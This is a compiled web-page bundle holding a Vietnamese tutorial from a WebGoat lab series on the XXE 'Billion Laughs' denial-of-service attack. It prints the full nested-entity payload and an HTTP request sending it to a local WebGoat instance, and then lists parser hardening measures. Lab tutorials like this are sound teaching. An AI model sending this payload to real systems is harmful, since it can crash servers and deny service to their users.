"use strict";(self.webpackChunktiennhm_github_io=self.webpackChunktiennhm_github_io||[]).push([[6762],{11486:(l,n,o)=>{o.r(n),o.d(n,{assets:()=>c,contentTitle:()=>s,default:()=>d,frontMatter:()=>i,metadata:()=>r,toc:()=>h});var e=o(74848),t=o(28453);const i={title:"1.09 | XXE",slug:"XXE-09",description:"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8",image:"https://tiennhm.github.io/img/docs/database.jpg",sidebar_position:1,tags:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],keywords:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],enableComments:!0,draft:!1},s=void 0,r={id:"web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-09",title:"1.09 | XXE",description:"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8",source:"@site/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-09.md",sourceDirName:"02-web-security/webgoat-2023.8/A5-Security-Misconfiguration",slug:"/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-09",permalink:"/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-09",draft:!1,unlisted:!1,editUrl:"https://github.com/TienNHM/tiennhm.github.io/tree/master/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-09.md",tags:[{inline:!0,label:"web-security",permalink:"/docs/tags/web-security"},{inline:!0,label:"webgoat",permalink:"/docs/tags/webgoat"},{inline:!0,label:"security-misconfiguration",permalink:"/docs/tags/security-misconfiguration"},{inline:!0,label:"xxe",permalink:"/docs/tags/xxe"},{inline:!0,label:"webgoat-2023.8",permalink:"/docs/tags/webgoat-2023-8"}],version:"current",lastUpdatedAt:1755314501e3,sidebarPosition:1,frontMatter:{title:"1.09 | XXE",slug:"XXE-09",description:"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8",image:"https://tiennhm.github.io/img/docs/database.jpg",sidebar_position:1,tags:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],keywords:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],enableComments:!0,draft:!1},sidebar:"tutorialSidebar",previous:{title:"1.08 | XXE",permalink:"/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-08"},next:{title:"1.10 | XXE",permalink:"/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-10"}},c={},h=[{value:"<strong>1. Gi\u1edbi thi\u1ec7u v\u1ec1 t\u1ea5n c\xf4ng XXE DoS</strong>",id:"1-gi\u1edbi-thi\u1ec7u-v\u1ec1-t\u1ea5n-c\xf4ng-xxe-dos",level:2},{value:"<strong>2. C\xe1ch ho\u1ea1t \u0111\u1ed9ng c\u1ee7a Billion Laughs Attack</strong>",id:"2-c\xe1ch-ho\u1ea1t-\u0111\u1ed9ng-c\u1ee7a-billion-laughs-attack",level:2},{value:"<strong>3. Th\u1eed nghi\u1ec7m v\u1edbi WebGoat</strong>",id:"3-th\u1eed-nghi\u1ec7m-v\u1edbi-webgoat",level:2},{value:"<strong>4. Bi\u1ec7n ph\xe1p ph\xf2ng ch\u1ed1ng XXE DoS</strong>",id:"4-bi\u1ec7n-ph\xe1p-ph\xf2ng-ch\u1ed1ng-xxe-dos",level:2},{value:"<strong>1\ufe0f\u20e3 T\u1eaft h\u1ed7 tr\u1ee3 ENTITY trong XML Parser</strong>",id:"1\ufe0f\u20e3-t\u1eaft-h\u1ed7-tr\u1ee3-entity-trong-xml-parser",level:3},{value:"<strong>2\ufe0f\u20e3 Gi\u1edbi h\u1ea1n s\u1ed1 l\u1ea7n m\u1edf r\u1ed9ng th\u1ef1c th\u1ec3</strong>",id:"2\ufe0f\u20e3-gi\u1edbi-h\u1ea1n-s\u1ed1-l\u1ea7n-m\u1edf-r\u1ed9ng-th\u1ef1c-th\u1ec3",level:3},{value:"<strong>3\ufe0f\u20e3 Ch\u1ec9 s\u1eed d\u1ee5ng JSON thay v\xec XML</strong>",id:"3\ufe0f\u20e3-ch\u1ec9-s\u1eed-d\u1ee5ng-json-thay-v\xec-xml",level:3},{value:"<strong>5. K\u1ebft lu\u1eadn</strong>",id:"5-k\u1ebft-lu\u1eadn",level:2}];function a(l){const n={blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,t.R)(),...l.components};return(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.blockquote,{children:["\n",(0,e.jsx)(n.p,{children:(0,e.jsx)(n.strong,{children:"XXE DoS Attack \u2013 Billion Laughs Attack"})}),"\n"]}),"\n",(0,e.jsx)(n.h2,{id:"1-gi\u1edbi-thi\u1ec7u-v\u1ec1-t\u1ea5n-c\xf4ng-xxe-dos",children:(0,e.jsx)(n.strong,{children:"1. Gi\u1edbi thi\u1ec7u v\u1ec1 t\u1ea5n c\xf4ng XXE DoS"})}),"\n",(0,e.jsxs)(n.p,{children:["Trong b\xe0i tr\u01b0\u1edbc, ta \u0111\xe3 th\u1ea5y ",(0,e.jsx)(n.strong,{children:"XXE Injection"})," c\xf3 th\u1ec3 \u0111\u01b0\u1ee3c d\xf9ng \u0111\u1ec3 \u0111\u1ecdc file h\u1ec7 th\u1ed1ng. Nh\u01b0ng ngo\xe0i vi\u1ec7c \u0111\u1ecdc d\u1eef li\u1ec7u, ",(0,e.jsx)(n.strong,{children:"XXE c\u0169ng c\xf3 th\u1ec3 g\xe2y t\u1ea5n c\xf4ng t\u1eeb ch\u1ed1i d\u1ecbch v\u1ee5 (DoS \u2013 Denial of Service)"}),"."]}),"\n",(0,e.jsxs)(n.p,{children:["\ud83d\udca1 M\u1ed9t trong nh\u1eefng k\u1ef9 thu\u1eadt ph\u1ed5 bi\u1ebfn \u0111\u1ec3 t\u1ea5n c\xf4ng DoS th\xf4ng qua XXE l\xe0 ",(0,e.jsx)(n.strong,{children:"Billion Laughs Attack"}),"."]}),"\n",(0,e.jsx)(n.h2,{id:"2-c\xe1ch-ho\u1ea1t-\u0111\u1ed9ng-c\u1ee7a-billion-laughs-attack",children:(0,e.jsx)(n.strong,{children:"2. C\xe1ch ho\u1ea1t \u0111\u1ed9ng c\u1ee7a Billion Laughs Attack"})}),"\n",(0,e.jsx)(n.p,{children:"\u0110\xe2y l\xe0 payload XML th\u1ef1c hi\u1ec7n t\u1ea5n c\xf4ng:"}),"\n",(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE lolz [\n    <!ENTITY lol "lol">\n    <!ELEMENT lolz (#PCDATA)>\n    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">\n    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">\n    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">\n]>\n<lolz>&lol9;</lolz>\n'})}),"\n",(0,e.jsxs)(n.p,{children:["\ud83d\udccc ",(0,e.jsx)(n.strong,{children:"Ph\xe2n t\xedch c\xe1ch ho\u1ea1t \u0111\u1ed9ng"})]}),"\n",(0,e.jsxs)(n.ol,{children:["\n",(0,e.jsxs)(n.li,{children:["\n",(0,e.jsxs)(n.p,{children:[(0,e.jsxs)(n.strong,{children:["Khai b\xe1o th\u1ef1c th\u1ec3 (",(0,e.jsx)(n.code,{children:"ENTITY"}),") l\u1ed3ng nhau"]}),":"]}),"\n",(0,e.jsxs)(n.ul,{children:["\n",(0,e.jsxs)(n.li,{children:[(0,e.jsx)(n.code,{children:"&lol;"})," = ",(0,e.jsx)(n.code,{children:'"lol"'})]}),"\n",(0,e.jsxs)(n.li,{children:[(0,e.jsx)(n.code,{children:"&lol1;"})," = ",(0,e.jsx)(n.code,{children:"10 x &lol;"})]}),"\n",(0,e.jsxs)(n.li,{children:[(0,e.jsx)(n.code,{children:"&lol2;"})," = ",(0,e.jsx)(n.code,{children:"10 x &lol1;"})]}),"\n",(0,e.jsxs)(n.li,{children:[(0,e.jsx)(n.code,{children:"&lol3;"})," = ",(0,e.jsx)(n.code,{children:"10 x &lol2;"})]}),"\n",(0,e.jsx)(n.li,{children:"\u2026"}),"\n",(0,e.jsxs)(n.li,{children:[(0,e.jsx)(n.code,{children:"&lol9;"})," = ",(0,e.jsx)(n.code,{children:"10 x &lol8;"})]}),"\n"]}),"\n"]}),"\n",(0,e.jsxs)(n.li,{children:["\n",(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.strong,{children:"T\u1ed5ng dung l\u01b0\u1ee3ng khi m\u1edf r\u1ed9ng th\u1ef1c th\u1ec3"}),":"]}),"\n",(0,e.jsxs)(n.ul,{children:["\n",(0,e.jsx)(n.li,{children:"D\u1eef li\u1ec7u XML ban \u0111\u1ea7u ch\u1ec9 v\xe0i tr\u0103m byte."}),"\n",(0,e.jsx)(n.li,{children:"Sau khi m\u1edf r\u1ed9ng th\u1ef1c th\u1ec3, n\xf3 chi\u1ebfm g\u1ea7n 3GB b\u1ed9 nh\u1edb."}),"\n",(0,e.jsx)(n.li,{children:"Server c\xf3 th\u1ec3 b\u1ecb crash v\xec h\u1ebft b\u1ed9 nh\u1edb."}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,e.jsx)(n.h2,{id:"3-th\u1eed-nghi\u1ec7m-v\u1edbi-webgoat",children:(0,e.jsx)(n.strong,{children:"3. Th\u1eed nghi\u1ec7m v\u1edbi WebGoat"})}),"\n",(0,e.jsxs)(n.p,{children:["G\u1eedi request ch\u1ee9a payload ",(0,e.jsx)(n.strong,{children:"Billion Laughs Attack"}),":"]}),"\n",(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:"language-http",children:'POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1\nContent-Type: application/xml\n\n<?xml version="1.0"?>\n<!DOCTYPE lolz [\n    <!ENTITY lol "lol">\n    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">\n    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">\n    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">\n]>\n<lolz>&lol9;</lolz>\n'})}),"\n",(0,e.jsxs)(n.p,{children:["\ud83d\uded1 ",(0,e.jsx)(n.strong,{children:"K\u1ebft qu\u1ea3 mong \u0111\u1ee3i"}),":"]}),"\n",(0,e.jsxs)(n.ul,{children:["\n",(0,e.jsxs)(n.li,{children:["N\u1ebfu h\u1ec7 th\u1ed1ng ",(0,e.jsx)(n.strong,{children:"d\u1ec5 b\u1ecb t\u1ea5n c\xf4ng"}),", server c\xf3 th\u1ec3 ",(0,e.jsx)(n.strong,{children:"b\u1ecb crash"})," do h\u1ebft b\u1ed9 nh\u1edb."]}),"\n",(0,e.jsx)(n.li,{children:"N\u1ebfu h\u1ec7 th\u1ed1ng \u0111\xe3 c\xf3 b\u1ea3o v\u1ec7, n\xf3 s\u1ebd t\u1eeb ch\u1ed1i request v\u1edbi l\u1ed7i:"}),"\n"]}),"\n",(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{children:"javax.xml.stream.XMLStreamException: Maximum entity expansion limit reached\n"})}),"\n",(0,e.jsx)(n.h2,{id:"4-bi\u1ec7n-ph\xe1p-ph\xf2ng-ch\u1ed1ng-xxe-dos",children:(0,e.jsx)(n.strong,{children:"4. Bi\u1ec7n ph\xe1p ph\xf2ng ch\u1ed1ng XXE DoS"})}),"\n",(0,e.jsx)(n.h3,{id:"1\ufe0f\u20e3-t\u1eaft-h\u1ed7-tr\u1ee3-entity-trong-xml-parser",children:(0,e.jsx)(n.strong,{children:"1\ufe0f\u20e3 T\u1eaft h\u1ed7 tr\u1ee3 ENTITY trong XML Parser"})}),"\n",(0,e.jsxs)(n.p,{children:["Trong Java, c\xf3 th\u1ec3 ch\u1eb7n ",(0,e.jsx)(n.strong,{children:"ENTITY"})," \u0111\u1ec3 ng\u0103n t\u1ea5n c\xf4ng XXE:"]}),"\n",(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:"language-java",children:'DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nfactory.setFeature("http://xml.org/sax/features/external-general-entities", false);\nfactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);\nfactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);\nDocumentBuilder builder = factory.newDocumentBuilder();\n'})}),"\n",(0,e.jsx)(n.h3,{id:"2\ufe0f\u20e3-gi\u1edbi-h\u1ea1n-s\u1ed1-l\u1ea7n-m\u1edf-r\u1ed9ng-th\u1ef1c-th\u1ec3",children:(0,e.jsx)(n.strong,{children:"2\ufe0f\u20e3 Gi\u1edbi h\u1ea1n s\u1ed1 l\u1ea7n m\u1edf r\u1ed9ng th\u1ef1c th\u1ec3"})}),"\n",(0,e.jsx)(n.p,{children:"M\u1ed9t s\u1ed1 th\u01b0 vi\u1ec7n cho ph\xe9p \u0111\u1eb7t gi\u1edbi h\u1ea1n s\u1ed1 l\u1ea7n m\u1edf r\u1ed9ng th\u1ef1c th\u1ec3 \u0111\u1ec3 tr\xe1nh l\u1eb7p v\xf4 h\u1ea1n."}),"\n",(0,e.jsxs)(n.p,{children:["Trong ",(0,e.jsx)(n.strong,{children:"Python"})," v\u1edbi ",(0,e.jsx)(n.code,{children:"lxml"}),":"]}),"\n",(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:"language-python",children:"from lxml import etree\n\nparser = etree.XMLParser(resolve_entities=False)  # Ch\u1eb7n m\u1edf r\u1ed9ng ENTITY\nxml_data = '<!DOCTYPE foo [<!ENTITY x \"Hello\">]><foo>&x;</foo>'\netree.fromstring(xml_data, parser)  # Kh\xf4ng b\u1ecb XXE\n"})}),"\n",(0,e.jsxs)(n.p,{children:["Trong ",(0,e.jsx)(n.strong,{children:"Spring Boot"}),", c\xf3 th\u1ec3 c\u1ea5u h\xecnh ",(0,e.jsx)(n.code,{children:"JacksonXmlModule"}),":"]}),"\n",(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:"language-java",children:"JacksonXmlModule module = new JacksonXmlModule();\nmodule.setDefaultUseWrapper(false);\nXmlMapper xmlMapper = new XmlMapper(module);\nxmlMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);\n"})}),"\n",(0,e.jsx)(n.h3,{id:"3\ufe0f\u20e3-ch\u1ec9-s\u1eed-d\u1ee5ng-json-thay-v\xec-xml",children:(0,e.jsx)(n.strong,{children:"3\ufe0f\u20e3 Ch\u1ec9 s\u1eed d\u1ee5ng JSON thay v\xec XML"})}),"\n",(0,e.jsxs)(n.p,{children:["N\u1ebfu \u1ee9ng d\u1ee5ng kh\xf4ng th\u1ef1c s\u1ef1 c\u1ea7n XML, t\u1ed1t nh\u1ea5t ch\u1ec9 s\u1eed d\u1ee5ng ",(0,e.jsx)(n.strong,{children:"JSON"})," \u0111\u1ec3 tr\xe1nh c\xe1c l\u1ed7 h\u1ed5ng li\xean quan \u0111\u1ebfn XML."]}),"\n",(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:"language-json",children:'{\n    "message": "Hello, world!"\n}\n'})}),"\n",(0,e.jsx)(n.h2,{id:"5-k\u1ebft-lu\u1eadn",children:(0,e.jsx)(n.strong,{children:"5. K\u1ebft lu\u1eadn"})}),"\n",(0,e.jsxs)(n.ul,{children:["\n",(0,e.jsxs)(n.li,{children:[(0,e.jsx)(n.strong,{children:"XXE DoS Attack (Billion Laughs Attack)"})," c\xf3 th\u1ec3 l\xe0m server b\u1ecb crash b\u1eb1ng c\xe1ch m\u1edf r\u1ed9ng th\u1ef1c th\u1ec3 l\u1eb7p v\xf4 h\u1ea1n."]}),"\n",(0,e.jsxs)(n.li,{children:[(0,e.jsx)(n.strong,{children:"Th\u1eed nghi\u1ec7m tr\xean WebGoat"})," b\u1eb1ng c\xe1ch g\u1eedi m\u1ed9t payload v\u1edbi nhi\u1ec1u ENTITY l\u1ed3ng nhau."]}),"\n",(0,e.jsxs)(n.li,{children:[(0,e.jsx)(n.strong,{children:"Ph\xf2ng ch\u1ed1ng"})," b\u1eb1ng c\xe1ch:","\n",(0,e.jsxs)(n.ol,{children:["\n",(0,e.jsx)(n.li,{children:"T\u1eaft ENTITY trong XML Parser."}),"\n",(0,e.jsx)(n.li,{children:"Gi\u1edbi h\u1ea1n s\u1ed1 l\u1ea7n m\u1edf r\u1ed9ng th\u1ef1c th\u1ec3."}),"\n",(0,e.jsx)(n.li,{children:"Chuy\u1ec3n sang JSON thay v\xec XML n\u1ebfu c\xf3 th\u1ec3."}),"\n"]}),"\n"]}),"\n"]})]})}function d(l={}){const{wrapper:n}={...(0,t.R)(),...l.components};return n?(0,e.jsx)(n,{...l,children:(0,e.jsx)(a,{...l})}):a(l)}},28453:(l,n,o)=>{o.d(n,{R:()=>s,x:()=>r});var e=o(96540);const t={},i=e.createContext(t);function s(l){const n=e.useContext(i);return e.useMemo((function(){return"function"==typeof l?l(n):{...n,...l}}),[n,l])}function r(l){let n;return n=l.disableParentContext?"function"==typeof l.components?l.components(t):l.components||t:s(l.components),e.createElement(i.Provider,{value:n},l.children)}}}]);